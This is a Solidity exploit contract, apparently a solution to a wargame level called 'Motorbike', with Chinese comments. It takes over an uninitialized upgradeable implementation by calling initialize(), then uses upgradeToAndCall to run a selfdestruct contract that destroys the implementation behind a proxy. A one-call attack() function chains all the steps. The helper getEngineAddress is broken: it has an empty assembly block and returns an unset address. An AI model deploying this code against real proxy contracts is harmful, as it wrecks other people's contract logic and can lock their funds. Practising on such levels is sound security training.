// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract Destroyer {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeAttack {
    address public proxy;
    address public engine;
    address public destroyer;
    
    // EIP-1967 implementation slot
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    constructor(address _proxy) public {
        proxy = _proxy;
    }
    
    // Step 1: 获取 Engine 地址
    function getEngineAddress() public returns (address) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        address impl;
        
        assembly {
            // 从 proxy 的 storage 读取
            // 注意：这需要在链上执行，或使用 eth_getStorageAt
        }
        
        // 实际上我们需要用 cast 来读取
        // cast storage $PROXY $IMPLEMENTATION_SLOT --rpc-url $RPC
        return impl;
    }
    
    // Step 2: 初始化 Engine
    function initializeEngine(address _engine) external {
        engine = _engine;
        IEngine(engine).initialize();
        
        require(
            IEngine(engine).upgrader() == address(this),
            "Failed to become upgrader"
        );
    }
    
    // Step 3: 部署 Destroyer
    function deployDestroyer() external {
        destroyer = address(new Destroyer());
    }
    
    // Step 4: 升级并销毁
    function destroyEngine() external {
        require(destroyer != address(0), "Deploy destroyer first");
        
        IEngine(engine).upgradeToAndCall(
            destroyer,
            abi.encodeWithSignature("destroy()")
        );
    }
    
    // 一键攻击
    function attack(address _engine) external {
        engine = _engine;
        
        // 初始化 Engine
        IEngine(engine).initialize();
        
        // 部署 Destroyer
        destroyer = address(new Destroyer());
        
        // 升级并销毁
        IEngine(engine).upgradeToAndCall(
            destroyer,
            abi.encodeWithSignature("destroy()")
        );
    }
}